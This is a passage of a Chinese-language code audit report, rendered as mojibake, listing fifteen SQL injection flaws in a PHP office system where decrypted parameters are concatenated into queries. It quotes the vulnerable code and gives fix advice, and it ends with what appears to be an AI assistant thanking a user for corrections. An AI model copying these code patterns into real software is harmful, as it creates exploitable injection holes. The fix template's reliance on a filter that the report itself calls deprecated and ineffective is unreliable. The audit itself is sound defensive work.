æ‹¼æ¥</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€8ã€‘loginModel-php-cookieç™»å½•-Token-SQLæ³¨å…¥-â­â­â­â­"><a href="#ã€8ã€‘loginModel-php-cookieç™»å½•-Token-SQLæ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€8ã€‘loginModel.php - cookieç™»å½• - Token SQLæ³¨å…¥ â­â­â­â­"></a>ã€8ã€‘loginModel.php - cookieç™»å½• - Token SQLæ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/loginModel.php:361</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tokans</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;mo_adminid&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†cookie</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$tokans</span>))&#123;</span><br><span class="line">    <span class="variable">$onrs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`token`=&#x27;<span class="subst">$tokans</span>&#x27;&quot;</span>,<span class="string">&#x27;`name`,`token`,`id`,`uid`&#x27;</span>);  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li>é€šè¿‡cookieæ³¨å…¥</li><li>å¯èƒ½ç»•è¿‡ç™»å½•éªŒè¯</li></ul><hr><h3 id="ã€9ã€‘uploadAction-php-getwobaAction-åˆ†ç±»è¿‡æ»¤æ³¨å…¥-â­â­â­â­"><a href="#ã€9ã€‘uploadAction-php-getwobaAction-åˆ†ç±»è¿‡æ»¤æ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€9ã€‘uploadAction.php - getwobaAction() - åˆ†ç±»è¿‡æ»¤æ³¨å…¥ â­â­â­â­"></a>ã€9ã€‘uploadAction.php - getwobaAction() - åˆ†ç±»è¿‡æ»¤æ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/uploadAction.php:555</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getwobaAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fenlei</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fenlei&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$where</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getjoinstr</span>(<span class="string">&#x27;a.`receid`&#x27;</span>, <span class="variable">$this</span>-&gt;adminid, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ... ç„¶åæ‹¼æ¥åˆ°SQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ã€10ã€‘uploadAction-php-getfileAction-Keywordè¿‡æ»¤æ³¨å…¥-â­â­â­â­"><a href="#ã€10ã€‘uploadAction-php-getfileAction-Keywordè¿‡æ»¤æ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€10ã€‘uploadAction.php - getfileAction() - Keywordè¿‡æ»¤æ³¨å…¥ â­â­â­â­"></a>ã€10ã€‘uploadAction.php - getfileAction() - Keywordè¿‡æ»¤æ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/uploadAction.php:621</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>));  <span class="comment">// âš ï¸ åªæœ‰xssrepstrï¼Œæ²¡æœ‰SQLè¿‡æ»¤</span></span><br><span class="line"><span class="variable">$where</span>.=<span class="string">&quot; and `filename` like &#x27;%&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;%&#x27;&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€11-13ã€‘upgradeAction-php-ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´-â­â­â­â­â­"><a href="#ã€11-13ã€‘upgradeAction-php-ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´-â­â­â­â­â­" class="headerlink" title="ã€11-13ã€‘upgradeAction.php - ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´ â­â­â­â­â­"></a>ã€11-13ã€‘upgradeAction.php - ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´ â­â­â­â­â­</h3><h4 id="11-shengjianssAjax-SQLè¯­å¥ç›´æ¥æ‰§è¡Œ"><a href="#11-shengjianssAjax-SQLè¯­å¥ç›´æ¥æ‰§è¡Œ" class="headerlink" title="11. shengjianssAjax() - SQLè¯­å¥ç›´æ¥æ‰§è¡Œ"></a>11. shengjianssAjax() - SQLè¯­å¥ç›´æ¥æ‰§è¡Œ</h4><p><strong>æ–‡ä»¶</strong>: <code>/webmain/system/upgrade/upgradeAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$type</span>==<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="variable">$sqarr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;ROCKSPLIT&#x27;</span>, <span class="variable">$fcont</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sqarr</span> <span class="keyword">as</span> <span class="variable">$_sql1</span>)<span class="keyword">if</span>(<span class="variable">$_sql1</span>)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$_sql1</span>,<span class="literal">false</span>);  <span class="comment">// âš ï¸ ç›´æ¥æ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-shengjifile"><a href="#12-shengjifile" class="headerlink" title="12. shengjifile()"></a>12. shengjifile()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$barr</span>[<span class="string">&#x27;data&#x27;</span>]);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="variable">$fcont</span>);  <span class="comment">// âš ï¸ ç›´æ¥ä¼ å…¥</span></span><br></pre></td></tr></table></figure><h4 id="13-newinstallinfoAjax"><a href="#13-newinstallinfoAjax" class="headerlink" title="13. newinstallinfoAjax()"></a>13. newinstallinfoAjax()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nwsp</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;path&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="comment">// ... è¯»å–æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$mysqlpath</span>), <span class="number">1</span>);  <span class="comment">// âš ï¸ æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€14ã€‘whereModel-php-getstrwhere-WHEREå­å¥æ³¨å…¥-â­â­â­â­"><a href="#ã€14ã€‘whereModel-php-getstrwhere-WHEREå­å¥æ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€14ã€‘whereModel.php - getstrwhere() - WHEREå­å¥æ³¨å…¥ â­â­â­â­"></a>ã€14ã€‘whereModel.php - getstrwhere() - WHEREå­å¥æ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/whereModel.php:231</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getstrwhere</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$uid</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$fid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$str</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$where</span>==<span class="string">&#x27;all&#x27;</span> || <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;super&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;allsuper&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;company&#125;&#x27;</span>))<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// ... ç„¶åç›´æ¥ç”¨äºSQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é…åˆä½¿ç”¨çš„åœ°æ–¹</strong>ï¼ˆflowModel.php:152ï¼‰:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wheresstr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getstrwhere</span>(<span class="variable">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$rs</span>[<span class="string">&#x27;wheresstr&#x27;</span>]), <span class="variable">$uid</span>, <span class="variable">$fid</span>);</span><br><span class="line"><span class="comment">// ... ç›´æ¥æ‹¼æ¥åˆ°SQL</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€15ã€‘webmainAction-php-limitRows-WHERE-KEYWHEREæ³¨å…¥-â­â­â­â­â­"><a href="#ã€15ã€‘webmainAction-php-limitRows-WHERE-KEYWHEREæ³¨å…¥-â­â­â­â­â­" class="headerlink" title="ã€15ã€‘webmainAction.php - limitRows() - WHERE&#x2F;KEYWHEREæ³¨å…¥ â­â­â­â­â­"></a>ã€15ã€‘webmainAction.php - limitRows() - WHERE&#x2F;KEYWHEREæ³¨å…¥ â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/webmainAction.php:120</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">limitRows</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$wherea</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;keywhere&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))&#123;</span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$where</span>));  <span class="comment">// âš ï¸ å…ˆè¿‡æ»¤åŠ å¯†ä¸²ï¼Œå†è§£å¯†</span></span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$where</span>));  <span class="comment">// âš ï¸ filterstrå·²å¼ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$keywhere</span>))&#123;</span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$keywhere</span>));  <span class="comment">// âš ï¸ è¿‡æ»¤é€»è¾‘é”™è¯¯</span></span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$keywhere</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$wherea</span> .= <span class="string">&quot; <span class="subst">$where</span> <span class="subst">$keywhere</span>&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é—®é¢˜</strong>:</p><ul><li><strong>å…ˆå¯¹åŠ å¯†ä¸²è¿‡æ»¤ï¼ˆæ— æ•ˆï¼‰</strong></li><li><strong>å†è§£å¯†ï¼ˆæ¢å¤SQLå…³é”®å­—ï¼‰</strong></li><li><strong>ç„¶åç”¨å·²å¼ƒç”¨çš„filterstrï¼ˆä¸èµ·ä½œç”¨ï¼‰</strong></li></ul><hr><h2 id="ğŸ“Š-æ¼æ´ç»Ÿè®¡"><a href="#ğŸ“Š-æ¼æ´ç»Ÿè®¡" class="headerlink" title="ğŸ“Š æ¼æ´ç»Ÿè®¡"></a>ğŸ“Š æ¼æ´ç»Ÿè®¡</h2><table><thead><tr><th align="left">åºå·</th><th align="left">æ–‡ä»¶</th><th align="left">æ–¹æ³•</th><th align="left">è§£å¯†æ–¹å¼</th><th align="left">å±å®³ç­‰çº§</th><th align="left">æ˜¯å¦æœ‰è¿‡æ»¤</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">inputAction.php</td><td align="left">getselectdataAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">2</td><td align="left">tableAction.php</td><td align="left">savedbupurlAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">3</td><td align="left">loginAction.php</td><td align="left">jinxwqqtbAction</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">4</td><td align="left">loginAction.php</td><td align="left">yzmAction</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">5</td><td align="left">goodsModel.php</td><td align="left">getpage</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">6</td><td align="left">crmModel.php</td><td align="left">getclientselect</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">7</td><td align="left">crmModel.php</td><td align="left">getclientpage</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">8</td><td align="left">loginModel.php</td><td align="left">cookieç™»å½•</td><td align="left">uncrypt</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">9</td><td align="left">uploadAction.php</td><td align="left">getwobaAction</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">10</td><td align="left">uploadAction.php</td><td align="left">getfileAction</td><td align="left">base64decode</td><td align="left">ä»…xssrepstr</td><td align="left">æ— SQLè¿‡æ»¤</td></tr><tr><td align="left">11</td><td align="left">upgradeAction.php</td><td align="left">shengjianssAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">12</td><td align="left">upgradeAction.php</td><td align="left">shengjifile</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">13</td><td align="left">upgradeAction.php</td><td align="left">newinstallinfoAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">14</td><td align="left">whereModel.php</td><td align="left">getstrwhere</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">15</td><td align="left">webmainAction.php</td><td align="left">limitRows</td><td align="left">uncrypt</td><td align="left">â­â­â­â­â­</td><td align="left">è¿‡æ»¤é€»è¾‘é”™è¯¯</td></tr></tbody></table><hr><h2 id="ğŸ¯-æ ¹æœ¬åŸå› åˆ†æ"><a href="#ğŸ¯-æ ¹æœ¬åŸå› åˆ†æ" class="headerlink" title="ğŸ¯ æ ¹æœ¬åŸå› åˆ†æ"></a>ğŸ¯ æ ¹æœ¬åŸå› åˆ†æ</h2><h3 id="1-é”™è¯¯çš„åŠ å¯†-å®‰å…¨çš„æ€ç»´"><a href="#1-é”™è¯¯çš„åŠ å¯†-å®‰å…¨çš„æ€ç»´" class="headerlink" title="1. é”™è¯¯çš„åŠ å¯†&#x3D;å®‰å…¨çš„æ€ç»´"></a>1. é”™è¯¯çš„åŠ å¯†&#x3D;å®‰å…¨çš„æ€ç»´</h3><p>å¼€å‘è€…è®¤ä¸ºåªè¦å‚æ•°åŠ å¯†äº†å°±å®‰å…¨ï¼Œ<strong>å¿˜è®°äº†è§£å¯†åè¿˜éœ€è¦è¿‡æ»¤</strong></p><h3 id="2-è¿‡æ»¤æ—¶æœºé”™è¯¯"><a href="#2-è¿‡æ»¤æ—¶æœºé”™è¯¯" class="headerlink" title="2. è¿‡æ»¤æ—¶æœºé”™è¯¯"></a>2. è¿‡æ»¤æ—¶æœºé”™è¯¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é”™è¯¯ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="title function_ invoke__">iconvsql</span>(<span class="variable">$encrypted_string</span>)  <span class="comment">// è¿‡æ»¤åŠ å¯†ä¸² â† æ— æ„ä¹‰</span></span><br><span class="line">jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$filtered</span>)       <span class="comment">// è§£å¯†åæ¢å¤SQLå…³é”®å­—</span></span><br></pre></td></tr></table></figure><p><strong>æ­£ç¡®åº”è¯¥æ˜¯</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$plain</span> = jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$encrypted</span>)  <span class="comment">// å…ˆè§£å¯†</span></span><br><span class="line"><span class="variable">$safe</span>  = <span class="title function_ invoke__">iconvsql</span>(<span class="variable">$plain</span>)         <span class="comment">// å†è¿‡æ»¤æ˜æ–‡</span></span><br></pre></td></tr></table></figure><h3 id="3-filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨"><a href="#3-filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨" class="headerlink" title="3. filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨"></a>3. filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysqlClass.php</span></span><br><span class="line"><span class="comment">//å¼ƒç”¨è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... ä½†webmainAction.phpè¿˜åœ¨ç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="ğŸ’¡-ä¿®å¤å»ºè®®"><a href="#ğŸ’¡-ä¿®å¤å»ºè®®" class="headerlink" title="ğŸ’¡ ä¿®å¤å»ºè®®"></a>ğŸ’¡ ä¿®å¤å»ºè®®</h2><h3 id="1-ç«‹å³ä¿®å¤"><a href="#1-ç«‹å³ä¿®å¤" class="headerlink" title="1. ç«‹å³ä¿®å¤"></a>1. ç«‹å³ä¿®å¤</h3><p><strong>æ‰€æœ‰è§£å¯†æ“ä½œåå¿…é¡»è¿‡æ»¤</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¿®å¤æ¨¡æ¿</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;param&#x27;</span>));  <span class="comment">// è§£å¯†</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$param</span>);                  <span class="comment">// è¿‡æ»¤æ˜æ–‡</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$param</span>);                   <span class="comment">// äºŒæ¬¡è¿‡æ»¤</span></span><br><span class="line"><span class="comment">// æˆ–ä½¿ç”¨é¢„å¤„ç†</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM table WHERE field = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$param</span>]);</span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰"><a href="#2-ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰" class="headerlink" title="2. ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰"></a>2. ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¨èåšæ³•</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM admin WHERE mobile = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$shouji</span>]);</span><br></pre></td></tr></table></figure><h3 id="3-åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨"><a href="#3-åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨" class="headerlink" title="3. åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨"></a>3. åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨</h3><p><strong>åŠ å¯†ä¸æ˜¯å®‰å…¨æ§åˆ¶</strong>ï¼Œåº”è¯¥ï¼š</p><ul><li>ç§»é™¤æ‰€æœ‰â€å…ˆè¿‡æ»¤åŠ å¯†ä¸²â€çš„é€»è¾‘</li><li>ç»Ÿä¸€åœ¨è§£å¯†åç«‹å³è¿‡æ»¤</li><li>ä½¿ç”¨ç™½åå•éªŒè¯</li></ul><hr><h2 id="ğŸš¨-å½±å“èŒƒå›´"><a href="#ğŸš¨-å½±å“èŒƒå›´" class="headerlink" title="ğŸš¨ å½±å“èŒƒå›´"></a>ğŸš¨ å½±å“èŒƒå›´</h2><p><strong>æœ¬ç³»ç»Ÿå­˜åœ¨ 15ä¸ªçœŸæ­£çš„è§£å¯†å‚æ•°SQLæ³¨å…¥æ¼æ´</strong>ï¼Œå…¶ä¸­ï¼š</p><ul><li><strong>1ä¸ªä¸‡èƒ½SQLæ³¨å…¥</strong> (å¯è¯»å–ä»»æ„è¡¨)</li><li><strong>4ä¸ªæå±æ¼æ´</strong> (å¯ç›´æ¥æ‰§è¡ŒSQLæˆ–ç»•è¿‡ç™»å½•)</li><li><strong>8ä¸ªé«˜å±æ¼æ´</strong> (å¯æ³¨å…¥å„ç§æŸ¥è¯¢)</li><li><strong>1ä¸ªä»»æ„é…ç½®å†™å…¥</strong> (å¯èƒ½RCE)</li><li><strong>1ä¸ªè¿‡æ»¤é€»è¾‘é”™è¯¯</strong> (å…¨å±€å½±å“)</li></ul><p><strong>å‡ ä¹æ‰€æœ‰éœ€è¦è®¤è¯çš„åŠŸèƒ½éƒ½å¯èƒ½è¢«ç»•è¿‡ï¼</strong></p><hr><h2 id="ğŸ“-å¤‡æ³¨"><a href="#ğŸ“-å¤‡æ³¨" class="headerlink" title="ğŸ“ å¤‡æ³¨"></a>ğŸ“ å¤‡æ³¨</h2><p>æ„Ÿè°¢ä½ çš„æŒ‡æ­£ï¼é€šè¿‡ä½ æŒ‡å‡ºçš„ä¸¤ä¸ªæ¼æ´ï¼Œæˆ‘å­¦ä¼šäº†è¯†åˆ«**â€è§£å¯†åæœªè¿‡æ»¤ç›´æ¥æ‹¼æ¥â€**è¿™ä¸ªè‡´å‘½æ¨¡å¼ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†å…¨éƒ¨15ä¸ªæ¼æ´ã€‚</p><p>è¿™ä¸ªç³»ç»Ÿçš„æ ¸å¿ƒé—®é¢˜åœ¨äºï¼š</p><ol><li><strong>åŠ å¯†â‰ å®‰å…¨</strong> çš„é”™è¯¯è®¤çŸ¥</li><li><strong>è¿‡æ»¤æ—¶æœºé”™è¯¯</strong> (å…ˆè¿‡æ»¤å¯†æ–‡å†è§£å¯†)</li><li><strong>åºŸå¼ƒçš„è¿‡æ»¤å‡½æ•°ä»åœ¨ä½¿ç”¨</strong></li></ol><hr><p>ç”Ÿæˆæ—¶é—´: 2025-10-09 å®¡è®¡å·¥å…·: äººå·¥ä»£ç å®¡è®¡ + 